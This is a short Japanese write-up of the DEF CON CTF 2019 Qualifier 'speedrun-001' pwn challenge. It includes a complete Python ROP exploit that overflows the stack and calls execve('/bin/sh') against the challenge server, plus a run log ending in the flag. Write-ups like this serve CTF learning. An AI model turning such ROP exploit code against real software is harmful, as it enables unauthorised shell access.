# [pwn 5pts] speedrun-001 - DEF CON CTF 2019 Qualifier
64ビットでPIEやSSPが無効ですが、static linkです。
```
$ checksec -f speedrun-001
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH	Symbols		FORTIFY	Fortified	Fortifiable  FILE
Partial RELRO   No canary found   NX enabled    No PIE          No RPATH   No RUNPATH   No Symbols      No	0		0	speedrun-001
```
単純なスタックオーバーフローがあるので、ROPで/bin/shを呼び出します。
static linkなのでROP gadgetは十分あり、/bin/shはgets@pltを利用してbssセクションに書き込みました。
```python
from ptrlib import *

elfpath = "./speedrun-001"

libc = ELF("/lib/x86_64-linux-gnu/libc-2.27.so")
sock = Socket("speedrun-001.quals2019.oooverflow.io", 31337)
elf = ELF(elfpath)
#sock = Process(elfpath)

addr_read = 0x4498a0
bss = 0x6b6000

rop_pop_rdi = 0x00400686
rop_pop_rsi = 0x004101f3
rop_pop_rax = 0x00415664
rop_pop_rdx = 0x004498b5
rop_syscall = 0x0040129c

payload = b'A' * 0x408
payload += p64(rop_pop_rdi)
payload += p64(0)
payload += p64(rop_pop_rsi)
payload += p64(bss)
payload += p64(rop_pop_rdx)
payload += p64(8)
payload += p64(addr_read)
payload += p64(rop_pop_rdi)
payload += p64(bss)
payload += p64(rop_pop_rsi)
payload += p64(0)
payload += p64(rop_pop_rdx)
payload += p64(0)
payload += p64(rop_pop_rax)
payload += p64(59)
payload += p64(rop_syscall)
#payload += b'A' * 

sock.sendline(payload)

from time import sleep
sleep(1)
sock.send("/bin/sh")

sock.interactive()
```

これダウンロードしてからフラグ提出まで約7分以上かかると5点になります。
意味分からん。
```
$ python solve.py 
[+] Socket: Successfully connected to speedrun-001.quals2019.oooverflow.io:31337
[ptrlib]$ Hello brave new challenger
Any last words?
This will be the last thing that you say: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA@
cat flag
[ptrlib]$ OOO{Ask any pwner. Any real pwner. It don't matter if you pwn by an inch or a m1L3. pwning's pwning.}
```

# 感想
内容は初心者向けの問題です。
